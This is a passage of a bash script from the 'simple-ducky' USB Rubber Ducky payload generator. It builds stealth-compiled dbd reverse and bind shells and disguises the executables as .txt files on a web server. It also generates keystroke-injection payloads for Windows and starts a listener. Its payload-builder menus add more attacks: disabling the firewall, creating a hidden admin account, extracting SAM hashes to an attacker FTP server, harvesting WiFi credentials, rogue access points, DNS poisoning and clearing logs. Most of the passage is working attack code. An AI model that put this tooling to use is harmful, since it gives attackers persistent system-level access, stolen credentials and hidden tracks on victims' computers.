		echo -e "\e[1;34mBuilding your custom dbd payload, this will take a moment...\e[0m"
		sleep 3 
		sed "/HOST/s/attackerip/$attackerip/g" /usr/share/simple-ducky/misc/dbd/conf/dbd_win_reverse.conf > /usr/share/simple-ducky/misc/dbd/dbd_win_reverse1.conf
		sed "/PORT/s/attackerport/$attackerport/g" /usr/share/simple-ducky/misc/dbd/dbd_win_reverse1.conf > /usr/share/simple-ducky/misc/dbd/dbd_win_reverse2.conf
		sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" /usr/share/simple-ducky/misc/dbd/dbd_win_reverse2.conf > /usr/share/simple-ducky/misc/dbd/dbd.h
		rm /usr/share/simple-ducky/misc/dbd/dbd_win_reverse1.conf
		rm /usr/share/simple-ducky/misc/dbd/dbd_win_reverse2.conf
		cd /usr/share/simple-ducky/misc/dbd/
		make mingw-cross CFLAGS=-DSTEALTH
		cp /usr/share/simple-ducky/misc/dbd/dbd.exe /var/www/winmgnt.txt
		cp /usr/share/simple-ducky/misc/psexec.exe /var/www/taskmgnt.txt
		rm dbd.exe
		cd /usr/share/simple-ducky
	elif [ "$payloadtype" == "bind" ]; then 
		read -p "What port do you want the victim to be listening on? " victimport
		echo ""
		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
		echo ""
	
		echo -e "\e[1;34mBuilding your custom dbd payload, this will take a moment...\e[0m"
		sleep 3 
		sed "/HOST/s/victimport/$victimport/g" /usr/share/simple-ducky/misc/dbd/conf/dbd_win_bind.conf > /usr/share/simple-ducky/misc/dbd/dbd_win_bind1.conf
		sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" /usr/share/simple-ducky/misc/dbd/dbd_win_bind1.conf > /usr/share/simple-ducky/misc/dbd/dbd.h
		rm /usr/share/simple-ducky/misc/dbd/dbd_win_bind1.conf
		cd /usr/share/simple-ducky/misc/dbd/
		make mingw-cross CFLAGS=-DSTEALTH
		cp /usr/share/simple-ducky/misc/dbd/dbd.exe /var/www/winmgnt.txt
		cp /usr/share/simple-ducky/misc/psexec.exe /var/www/taskmgnt.txt
		rm dbd.exe
		cd /usr/share/simple-ducky	
	fi		
	echo -e ""
	echo -e "\e[1;34mDone!\e[0m"
    sleep 3
    clear
	echo -e "\e[1;34mNow let's build your inject.bin\e[0m"
	echo ""
	echo -e "\e[1;34mWhat is the IP/Domain address for your webserver?\e[0m" 
	read -p "[Example: www.example.com | www.example.com:port | 192.168.1.100 ] " webserverip
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mPlease wait, generating your inject.bin\e[0m"
	echo ""
	sed "/http/s/domain/$webserverip/g" /usr/share/simple-ducky/payloads/windowsdbdVIS7nouac.conf > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del1.conf
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.exe\e[0m"
		echo ""
		read -p "Press any key to contiue" enter		
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.exe\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	fi 	
	clear
	
	
	if [ "$payloadtype" == "rev" ]; then
		read -p "Would you like me to setup a listener [y/n]? " listener
		clear
			if [ "$listener" == "n" ]; then
				read -p "Would you like to return to the main menu [y/n]? " option
			elif [ "$listener" == "y" ]; then
				xdg-open /usr/share/simple-ducky/ &
				service apache2 start
				clear
				chmod +x /usr/share/simple-ducky/misc/dbd/binaries/dbd
				cp /usr/share/simple-ducky/misc/dbd/binaries/dbd /usr/bin/dbd
				dbd -lvp $attackerport -k $attackersecret
			fi	
	elif [ "$payloadtype" == "bind" ]; then 
		echo -e "\e[1;34mWhen you are ready to connect to the victim, in your terminal enter:\e[0m"
		echo "dbd -nv victim.host.orip $victimport -k $attackersecret"
		echo ""
		read -p "Press any key to contiue" enter
		clear
		read -p "Would you like to return to the main menu [y/n]? " option 	
	fi		
		
		
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac
}

#################################################################################
# DBD Shell w/UAC (Admin Priv Shell|Windows 8)
#################################################################################
f_windowsdbdwin8uac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload uses a custom dbd executable (bind/reverse shell) and psexec to give the attacker a persistent shell with NT/SYSTEM ACCESS!! DBD uses a 128bit secure connection! In addition a task is scheduled to relaunch the shell every time a new user logs in. "
	echo -e "\e[1;31mNote:\e[0m Special thanks to durandal for developing dbd and helping me fine tune this incredible fast and powerful payload"
	echo -e "\e[1;31mTarget:\e[0m Windows Windows 8 w/UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m skysploit "
	echo ""
	echo ""
	echo -e "\e[1;34mLets start by building your evil executable\e[0m"
	echo ""
	read -p "Would you like a reverse or bind shell [rev|bind]? " payloadtype
	echo ""
	if [ "$payloadtype" == "rev" ]; then
		read -p "Where shall I send your persistent shell? " attackerip
		echo ""
		read -p "What port will you be listening on? " attackerport
		echo ""
		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
		echo ""
	
		echo -e "\e[1;34mBuilding your custom dbd payload, this will take a moment...\e[0m"
		sleep 3 
		sed "/HOST/s/attackerip/$attackerip/g" /usr/share/simple-ducky/misc/dbd/conf/dbd_win_reverse.conf > /usr/share/simple-ducky/misc/dbd/dbd_win_reverse1.conf
		sed "/PORT/s/attackerport/$attackerport/g" /usr/share/simple-ducky/misc/dbd/dbd_win_reverse1.conf > /usr/share/simple-ducky/misc/dbd/dbd_win_reverse2.conf
		sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" /usr/share/simple-ducky/misc/dbd/dbd_win_reverse2.conf > /usr/share/simple-ducky/misc/dbd/dbd.h
		rm /usr/share/simple-ducky/misc/dbd/dbd_win_reverse1.conf
		rm /usr/share/simple-ducky/misc/dbd/dbd_win_reverse2.conf
		cd /usr/share/simple-ducky/misc/dbd/
		make mingw-cross CFLAGS=-DSTEALTH
		cp /usr/share/simple-ducky/misc/dbd/dbd.exe /var/www/winmgnt.txt
		cp /usr/share/simple-ducky/misc/psexec.exe /var/www/taskmgnt.txt
		rm dbd.exe
		cd /usr/share/simple-ducky
	elif [ "$payloadtype" == "bind" ]; then 
		read -p "What port do you want the victim to be listening on? " victimport
		echo ""
		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
		echo ""
	
		echo -e "\e[1;34mBuilding your custom dbd payload, this will take a moment...\e[0m"
		sleep 3 
		sed "/HOST/s/victimport/$victimport/g" /usr/share/simple-ducky/misc/dbd/conf/dbd_win_bind.conf > /usr/share/simple-ducky/misc/dbd/dbd_win_bind1.conf
		sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" /usr/share/simple-ducky/misc/dbd/dbd_win_bind1.conf > /usr/share/simple-ducky/misc/dbd/dbd.h
		rm /usr/share/simple-ducky/misc/dbd/dbd_win_bind1.conf
		cd /usr/share/simple-ducky/misc/dbd/
		make mingw-cross CFLAGS=-DSTEALTH
		cp /usr/share/simple-ducky/misc/dbd/dbd.exe /var/www/winmgnt.txt
		cp /usr/share/simple-ducky/misc/psexec.exe /var/www/taskmgnt.txt
		rm dbd.exe
		cd /usr/share/simple-ducky	
	fi		
	echo -e ""
	echo -e "\e[1;34mDone!\e[0m"
    sleep 3
    clear
	echo -e "\e[1;34mNow let's build your inject.bin\e[0m"
	echo ""
	echo -e "\e[1;34mWhat is the IP/Domain address for your webserver?\e[0m" 
	read -p "[Example: www.example.com | www.example.com:port | 192.168.1.100 ] " webserverip
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mPlease wait, generating your inject.bin\e[0m"
	echo ""
	sed "/http/s/domain/$webserverip/g" /usr/share/simple-ducky/payloads/windowsdbdWIN8uac.conf > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del1.conf
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.exe\e[0m"
		echo ""
		read -p "Press any key to contiue" enter		
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.exe\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	fi 	
	clear
	
	
	if [ "$payloadtype" == "rev" ]; then
		read -p "Would you like me to setup a listener [y/n]? " listener
		clear
			if [ "$listener" == "n" ]; then
				read -p "Would you like to return to the main menu [y/n]? " option
			elif [ "$listener" == "y" ]; then
				xdg-open /usr/share/simple-ducky/ &
				service apache2 start
				clear
				chmod +x /usr/share/simple-ducky/misc/dbd/binaries/dbd
				cp /usr/share/simple-ducky/misc/dbd/binaries/dbd /usr/bin/dbd
				dbd -lvp $attackerport -k $attackersecret
			fi	
	elif [ "$payloadtype" == "bind" ]; then 
		echo -e "\e[1;34mWhen you are ready to connect to the victim, in your terminal enter:\e[0m"
		echo "dbd -nv victim.host.orip $victimport -k $attackersecret"
		echo ""
		read -p "Press any key to contiue" enter
		clear
		read -p "Would you like to return to the main menu [y/n]? " option 	
	fi		
		
		
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac
}

#################################################################################
# DBD Shell w/o UAC (Admin Priv Shell|Windows 8)
#################################################################################
f_windowsdbdwin8nouac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload uses a custom dbd executable (bind/reverse shell) and psexec to give the attacker a persistent shell with NT/SYSTEM ACCESS!! DBD uses a 128bit secure connection! In addition a task is scheduled to relaunch the shell every time a new user logs in. "
	echo -e "\e[1;31mNote:\e[0m Special thanks to durandal for developing dbd and helping me fine tune this incredible fast and powerful payload"
	echo -e "\e[1;31mTarget:\e[0m Windows Windows 8 w/o UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m skysploit "
	echo ""
	echo ""
	echo -e "\e[1;34mLets start by building your evil executable\e[0m"
	echo ""
	read -p "Would you like a reverse or bind shell [rev|bind]? " payloadtype
	echo ""
	if [ "$payloadtype" == "rev" ]; then
		read -p "Where shall I send your persistent shell? " attackerip
		echo ""
		read -p "What port will you be listening on? " attackerport
		echo ""
		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
		echo ""
	
		echo -e "\e[1;34mBuilding your custom dbd payload, this will take a moment...\e[0m"
		sleep 3 
		sed "/HOST/s/attackerip/$attackerip/g" /usr/share/simple-ducky/misc/dbd/conf/dbd_win_reverse.conf > /usr/share/simple-ducky/misc/dbd/dbd_win_reverse1.conf
		sed "/PORT/s/attackerport/$attackerport/g" /usr/share/simple-ducky/misc/dbd/dbd_win_reverse1.conf > /usr/share/simple-ducky/misc/dbd/dbd_win_reverse2.conf
		sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" /usr/share/simple-ducky/misc/dbd/dbd_win_reverse2.conf > /usr/share/simple-ducky/misc/dbd/dbd.h
		rm /usr/share/simple-ducky/misc/dbd/dbd_win_reverse1.conf
		rm /usr/share/simple-ducky/misc/dbd/dbd_win_reverse2.conf
		cd /usr/share/simple-ducky/misc/dbd/
		make mingw-cross CFLAGS=-DSTEALTH
		cp /usr/share/simple-ducky/misc/dbd/dbd.exe /var/www/winmgnt.txt
		cp /usr/share/simple-ducky/misc/psexec.exe /var/www/taskmgnt.txt
		rm dbd.exe
		cd /usr/share/simple-ducky
	elif [ "$payloadtype" == "bind" ]; then 
		read -p "What port do you want the victim to be listening on? " victimport
		echo ""
		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
		echo ""
	
		echo -e "\e[1;34mBuilding your custom dbd payload, this will take a moment...\e[0m"
		sleep 3 
		sed "/HOST/s/victimport/$victimport/g" /usr/share/simple-ducky/misc/dbd/conf/dbd_win_bind.conf > /usr/share/simple-ducky/misc/dbd/dbd_win_bind1.conf
		sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" /usr/share/simple-ducky/misc/dbd/dbd_win_bind1.conf > /usr/share/simple-ducky/misc/dbd/dbd.h
		rm /usr/share/simple-ducky/misc/dbd/dbd_win_bind1.conf
		cd /usr/share/simple-ducky/misc/dbd/
		make mingw-cross CFLAGS=-DSTEALTH
		cp /usr/share/simple-ducky/misc/dbd/dbd.exe /var/www/winmgnt.txt
		cp /usr/share/simple-ducky/misc/psexec.exe /var/www/taskmgnt.txt
		rm dbd.exe
		cd /usr/share/simple-ducky	
	fi		
	echo -e ""
	echo -e "\e[1;34mDone!\e[0m"
    sleep 3
    clear
	echo -e "\e[1;34mNow let's build your inject.bin\e[0m"
	echo ""
	echo -e "\e[1;34mWhat is the IP/Domain address for your webserver?\e[0m" 
	read -p "[Example: www.example.com | www.example.com:port | 192.168.1.100 ] " webserverip
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mPlease wait, generating your inject.bin\e[0m"
	echo ""
	sed "/http/s/domain/$webserverip/g" /usr/share/simple-ducky/payloads/windowsdbdWIN8nouac.conf > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del1.conf
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.exe\e[0m"
		echo ""
		read -p "Press any key to contiue" enter		
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.exe\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	fi 	
	clear
	
	
	if [ "$payloadtype" == "rev" ]; then
		read -p "Would you like me to setup a listener [y/n]? " listener
		clear
			if [ "$listener" == "n" ]; then
				read -p "Would you like to return to the main menu [y/n]? " option
			elif [ "$listener" == "y" ]; then
				xdg-open /usr/share/simple-ducky/ &
				service apache2 start
				clear
				chmod +x /usr/share/simple-ducky/misc/dbd/binaries/dbd
				cp /usr/share/simple-ducky/misc/dbd/binaries/dbd /usr/bin/dbd
				dbd -lvp $attackerport -k $attackersecret
			fi	
	elif [ "$payloadtype" == "bind" ]; then 
		echo -e "\e[1;34mWhen you are ready to connect to the victim, in your terminal enter:\e[0m"
		echo "dbd -nv victim.host.orip $victimport -k $attackersecret"
		echo ""
		read -p "Press any key to contiue" enter
		clear
		read -p "Would you like to return to the main menu [y/n]? " option 	
	fi		
		
		
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac
}
#################################################################################
# Payload Builder Banner
#################################################################################
f_payloadbuilderbanner(){
	clear
	echo -e "\e[1;31mWelcome to the Payload builder!\e[0m "
	echo -e 'Here every payload that the simple-ducky offers has been broken down by OS and permission level of the victim. In addition the options have been placed into three categories; Pre-Attack, Main-Attack and Post-Attack. Use as many or few as you would like.'
	echo -e "If you would like to contribute your payload contact the author at skysploit@gmail.com"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit)"
	echo -e ""
}

########################################################################################################
# Payload Builder Menu
########################################################################################################
f_payloadbuilder(){
	clear
	f_payloadbuilderbanner
	echo ""
	echo -e "\e[1;34mPlease select the Windows OS that you would like to target...\e[0m"
	echo ""
	echo "1. Windows XP & derivatives (User/Admin Access)"
	echo "2. Windows Vista/7 & derivatives (User Access)"
	echo "3. Windows Vista/7 & derivatives (Admin Access)"
	echo "4. Windows 8 & derivatives (User Access)"
	echo "5. Windows 8 & derivatives (Admin Access)"
	echo "6. Return to the Main Menu"
	echo ""
	read -p "Option: " osselect

	if [ "$osselect" == "1" ]; then
		cat /usr/share/simple-ducky/payloads/builder/os-select/xpusrall.conf > /usr/share/simple-ducky/payload.txt
	elif [ "$osselect" == "2" ]; then
		cat /usr/share/simple-ducky/payloads/builder/os-select/win7usr.conf > /usr/share/simple-ducky/payload.txt
	elif [ "$osselect" == "3" ]; then
		echo ""
		read -p "Is User Access Control (UAC) enabled on the victims machine [y|n]? " uacenabled
		if [ "$uacenabled" == "y" ]; then
			cat /usr/share/simple-ducky/payloads/builder/os-select/win7admuac.conf > /usr/share/simple-ducky/payload.txt
		elif [ "$uacenabled" == "n" ]; then
			cat /usr/share/simple-ducky/payloads/builder/os-select/win7admnouac.conf > /usr/share/simple-ducky/payload.txt
		fi
	elif [ "$osselect" == "4" ]; then
		cat /usr/share/simple-ducky/payloads/builder/os-select/win8usr.conf > /usr/share/simple-ducky/payload.txt
	elif [ "$osselect" == "5" ]; then
		echo ""
		read -p "Is User Access Control (UAC) enabled on the victims machine [y|n]? " uacenabled
		if [ "$uacenabled" == "y" ]; then
			cat /usr/share/simple-ducky/payloads/builder/os-select/win8admuac.conf > /usr/share/simple-ducky/payload.txt
		elif [ "$uacenabled" == "n" ]; then
			cat /usr/share/simple-ducky/payloads/builder/os-select/win8admnouac.conf > /usr/share/simple-ducky/payload.txt
		fi
	elif [ "$osselect" == "6" ]; then
		f_mainmenu
fi

echo  >> /usr/share/simple-ducky/payload.txt
f_preattackadd
}

############## Pre Attack Functions ########################
f_preattackadd(){
if [[ $osselect = 1 || $osselect = 3 || $osselect = 5 ]] ; then
		clear
		echo -e "\e[1;34mLets add some pre attack functions...\e[0m"
		echo ""
		echo "1. Minimize the command prompt (recommended for large payloads)"
		echo "2. Disable the Windows Firewall"
		echo "3. Enable Remote Desktop and Remote Assistance"
		echo "4. Create and hide an Admin User"
		echo "5. Continue to Attack Functions"
		echo ""
		read -p "Option: " preattack

	case $preattack in
	1) f_minimizecmd ;;
	2) f_disablefirewall ;;
	3) f_enablerdp ;;
	4) f_createusr ;;
	5) f_attackadd ;;
	*) clear;exit ;;
	esac

elif [[ $osselect = 2 || $osselect = 4 ]]; then
		clear
		echo ""
		echo -e "\e[1;34mLets add some pre attack functions...\e[0m"
		echo ""
		echo "1. Minimize the command prompt (recommended for large payloads)"
		echo "2. Continue to Attack Functions"
		echo ""
		read -p "Option: " preattack

	case $preattack in
	1) f_minimizecmd ;;
	2) f_attackadd ;;
	*) clear;exit ;;
	esac
fi
}

############## Attack Functions ########################
f_attackadd(){
	if [[ $osselect = 3 || $osselect = 5 ]]; then
		clear
		echo -e "\e[1;34mMain Attack Functions...\e[0m"
		echo ""
		echo "1. Extract SAM & SYSTEM (VSSOwn.vbs)"
		echo "2. Shells with Powershell; (Metasploit, Ncat, DBD, Custom User Defined)"
		echo "3. Proxy in the Middle (PiTM)"
		echo "4. WiFi Credential Harvester"
		echo "5. Rouge Access Point"
		echo "6. Auto Associate to Rogue Access Point"
		echo "7. Local DNS Poisoning"
		echo "8. Post Attack Options"
		echo ""
		read -p "Option: " mainattack

		case $mainattack in
		1) f_extracthash ;;
		2) f_revshells ;;
		3) f_pitmattack ;;
		4) f_wificreds ;;
		5) f_rogueaccess ;;
		6) f_autoassociate ;;
		7) f_dnspoison ;;
		8) f_postattackadd ;;
		*) clear;exit ;;
		esac

 	elif [ "$osselect" == "1" ]; then
 		clear
		echo -e "\e[1;34mMain Attack Functions...\e[0m"
		echo ""
		echo "1. Reverse Shell (No Download)"
		echo "2. Proxy in the Middle (PiTM)"
		echo "3. WiFi Credential Harvester"
		echo "4. Rouge Access Point"
		echo "5. Local DNS Poisoning"
		echo "6. Post Attack Options"
		echo ""
		read -p "Option: " mainattack

		case $mainattack in
		1) f_revshells ;;
		2) f_pitmattack ;;
		3) f_wificreds ;;
		4) f_rogueaccess ;;
		5) f_dnspoison ;;
		6) f_postattackadd ;;
		*) clear;exit ;;
		esac

	elif [[ $osselect == 2 || $osselect = 4 ]]; then
		clear
		echo -e "\e[1;34mMain Attack Functions...\e[0m"
		echo ""
		echo "1. Shells with Powershell; (Metasploit, Ncat, DBD, Custom User Defined)"
		echo "2. Proxy in the Middle (PiTM)"
		echo "3. WiFi Credential Harvester"
		echo "4. Rouge Access Point"
		echo "5. Auto Associate to Rogue Access Point"
		echo "6. Post Attack Options"
		echo ""
		read -p "Option: " mainattack

		case $mainattack in
		1) f_revshells ;;
		2) f_pitmattack ;;
		3) f_wificreds ;;
		4) f_rogueaccess ;;
		5) f_autoassociate ;;
		6) f_postattackadd ;;
		*) clear;exit ;;
		esac
	fi
}
############## Post Attack Functions ########################
f_postattackadd(){
		if [[ $osselect = 3 || $osselect = 5 ]]; then
			clear
			echo -e "\e[1;34mPost Attack Functions...\e[0m"
			echo ""
			echo "1. Clear all Logs"
			echo "2. Create Inject.bin"
			echo ""
			read -p "Option: " postattack

			case $postattack in
			1) f_clearlogs ;;
			2) f_injectcreate ;;
			*) clear;exit ;;
			esac
		elif [[ $osselect = 2 || $osselect = 4 ]]; then
			clear
			echo -e "\e[1;34mThere are no post attack options for user level access. Finalizing the payload...\e[0m"
			echo ""
			sleep 4
			f_injectcreate
		elif [ "$osselect" == "1" ]; then
			clear
			echo -e "\e[1;34mThere are no post attack options for XP. Finalizing the payload...\e[0m"
			echo ""
			sleep 4
			f_injectcreate
		fi
		
}

############ Pre Attack Option Add ###########################

####### Minimize Command Prompt ###########
f_minimizecmd(){
	clear
	echo -e "\e[1;34mAdding the hide command prompt option to your payload...\e[0m"
	echo ""
	sleep 3
	cat /usr/share/simple-ducky/payloads/builder/pre-attack/hidecmd.conf >> /usr/share/simple-ducky/payload.txt
	echo  >> /usr/share/simple-ducky/payload.txt
	echo ""
	echo -e "\e[1;32mDone! Returning to the Pre-Attack menu...\e[0m"
	echo ""
	sleep 3
	f_preattackadd
}

####### Disable Firewall Option ###########
f_disablefirewall(){
	clear
	echo -e "\e[1;34mAdding the disable firewall option to your payload...\e[0m"
	echo ""
	sleep 3
	cat /usr/share/simple-ducky/payloads/builder/pre-attack/firewall.conf >> /usr/share/simple-ducky/payload.txt
	echo  >> /usr/share/simple-ducky/payload.txt
	echo ""
	echo -e "\e[1;32mDone! Returning to the Pre-Attack menu...\e[0m"
	echo ""
	sleep 3
	f_preattackadd
}

####### Enable Remote Desktop ###########
f_enablerdp(){
	clear
	echo -e "\e[1;34mAdding the enable remote desktop and remote assistant option to your payload...\e[0m"
	echo ""
	sleep 3
	cat /usr/share/simple-ducky/payloads/builder/pre-attack/rdpenable.conf >> /usr/share/simple-ducky/payload.txt
	echo  >> /usr/share/simple-ducky/payload.txt
	echo ""
	echo -e "\e[1;32mDone! Returning to the Pre-Attack menu...\e[0m"
	echo ""
	sleep 3
	f_preattackadd
}

####### Admin Account Add Option ###########
f_createusr(){
	clear
	echo -e "\e[1;34mLet's configure the admin account. Note, the account will be hiden from the windows login screen...\e[0m"
	echo ""
	echo ""
	read -p "What would you like the username to be for your admin account? " attackeruser
	echo ""
	read -p "What would you like the password to be for your admin account? " attackerpass
	echo ""
	clear
	echo -e "\e[1;34mAdding the admin account to your payload...\e[0m"
	echo ""
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/simple-ducky/payloads/builder/pre-attack/admusradd.conf > /usr/share/simple-ducky/payloads/builder/pre-attack/admusradd_del1.conf
	sed "/STRING/s/attackerpass/$attackerpass/g" /usr/share/simple-ducky/payloads/builder/pre-attack/admusradd_del1.conf > /usr/share/simple-ducky/payloads/builder/pre-attack/admusradd_del2.conf
	sed "/STRING/s/attackerpass/$attackerpass/g" /usr/share/simple-ducky/payloads/builder/pre-attack/admusradd_del2.conf > /usr/share/simple-ducky/payloads/builder/pre-attack/admusradd_del3.conf
	cat /usr/share/simple-ducky/payloads/builder/pre-attack/admusradd_del3.conf >> /usr/share/simple-ducky/payload.txt
	echo  >> /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payloads/builder/pre-attack/admusradd_del1.conf
	rm /usr/share/simple-ducky/payloads/builder/pre-attack/admusradd_del2.conf
	rm /usr/share/simple-ducky/payloads/builder/pre-attack/admusradd_del3.conf
	echo ""
	echo -e "\e[1;32mDone! Returning to the Pre-Attack menu...\e[0m"
	echo ""
	sleep 3
	f_preattackadd
}

############ Main Attack Option Add ###########################

####### Extract Live Hash Option ###########
f_extracthash(){
	clear
	echo -e "\e[1;34mLet's configure some settings for the LM/NTLM extraction...\e[0m"
	echo ""
	echo ""
	read -p "What is the IP/Domain of your ftp server? " attackerftp
	echo ""
	read -p "What is the username for your ftp server? " attackerusername
	echo ""
	read -p "What is the password for your ftp server? " attackerpassword
	echo ""
	echo -e "What is the IP/Domain address for your webserver? " 
	read -p "[Example: www.example.com | www.example.com:port | $attackerftp]: " webserverip
	echo ""
	read -p "Please set a password to be for your encrypted zip files: " zippassword
	echo ""
	clear
	echo -e "\e[1;34mAdding the live hash extractor to your payload...\e[0m"
	echo ""
	sed "/STRING/s/attackerftp/$attackerftp/g" /usr/share/simple-ducky/payloads/builder/main-attack/livehash.conf > /usr/share/simple-ducky/payloads/builder/main-attack/livehash_del1.conf
	sed "/STRING/s/attackerusername/$attackerusername/g" /usr/share/simple-ducky/payloads/builder/main-attack/livehash_del1.conf > /usr/share/simple-ducky/payloads/builder/main-attack/livehash_del2.conf
	sed "/STRING/s/attackerpassword/$attackerpassword/g" /usr/share/simple-ducky/payloads/builder/main-attack/livehash_del2.conf > /usr/share/simple-ducky/payloads/builder/main-attack/livehash_del3.conf
	sed "/STRING/s/webserverip/$webserverip/g" /usr/share/simple-ducky/payloads/builder/main-attack/livehash_del3.conf > /usr/share/simple-ducky/payloads/builder/main-attack/livehash_del4.conf
	sed "/STRING/s/zippassword/$zippassword/g" /usr/share/simple-ducky/payloads/builder/main-attack/livehash_del4.conf > /usr/share/simple-ducky/payloads/builder/main-attack/livehash_del5.conf
	sed "/STRING/s/zippassword/$zippassword/g" /usr/share/simple-ducky/payloads/builder/main-attack/livehash_del5.conf > /usr/share/simple-ducky/payloads/builder/main-attack/livehash_del6.conf
	sed "/STRING/s/zippassword/$zippassword/g" /usr/share/simple-ducky/payloads/builder/main-attack/livehash_del6.conf > /usr/share/simple-ducky/payloads/builder/main-attack/livehash_del7.conf
	cat /usr/share/simple-ducky/payloads/builder/main-attack/livehash_del7.conf >> /usr/share/simple-ducky/payload.txt
	echo  >> /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payloads/builder/main-attack/livehash_del1.conf
	rm /usr/share/simple-ducky/payloads/builder/main-attack/livehash_del2.conf
	rm /usr/share/simple-ducky/payloads/builder/main-attack/livehash_del3.conf
	rm /usr/share/simple-ducky/payloads/builder/main-attack/livehash_del4.conf
	rm /usr/share/simple-ducky/payloads/builder/main-attack/livehash_del5.conf
	rm /usr/share/simple-ducky/payloads/builder/main-attack/livehash_del6.conf
	rm /usr/share/simple-ducky/payloads/builder/main-attack/livehash_del7.conf
	cp /usr/share/simple-ducky/misc/7za.exe /var/www/7za.exe	
	echo ""
	echo -e "\e[1;32mDone! Returning to the Main-Attack menu...\e[0m"
	echo ""
	sleep 3
	f_attackadd
}
